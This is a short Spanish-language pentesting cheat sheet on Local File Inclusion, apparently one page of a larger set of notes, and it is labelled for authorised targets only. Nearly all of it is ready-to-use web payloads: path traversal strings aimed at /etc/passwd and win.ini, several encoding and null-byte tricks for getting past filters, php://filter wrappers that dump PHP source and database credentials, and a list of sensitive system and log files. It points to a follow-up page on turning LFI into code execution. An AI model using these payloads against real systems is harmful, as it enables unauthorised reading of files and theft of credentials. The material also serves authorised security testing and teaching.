# LFI — Local File Inclusion

Ver índice: [lfi-rfi.md](lfi-rfi.md). **Solo sobre objetivos autorizados.**

## Detección

- Parámetros que cargan ficheros; prueba rutas conocidas:
```
?page=/etc/passwd
?page=../../../../etc/passwd
?file=..\..\..\..\windows\win.ini
```

## Bypass de filtros

```
%2e%2e%2f%2e%2e%2f            # ../../ URL-encoded
..%252f..%252f                # doble codificación
....//....//                  # filtro que elimina "../" una sola vez
/etc/passwd%00               # null byte (PHP < 5.3.4, legacy)
/var/www/../../etc/passwd    # rutas absolutas + traversal
```

## Leer código fuente (PHP wrappers)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config
```
Devuelve el PHP en base64 (así no se ejecuta y ves el código → a menudo credenciales de BD).

## Ficheros útiles

```
/etc/passwd  /etc/hosts  /proc/self/environ  /proc/self/cmdline
/var/log/apache2/access.log  /var/log/auth.log
C:\Windows\System32\drivers\etc\hosts   C:\inetpub\logs\...
```

## Notas

- Si consigues leer, el siguiente paso es intentar **ejecución** → [lfi-to-rce.md](lfi-to-rce.md).
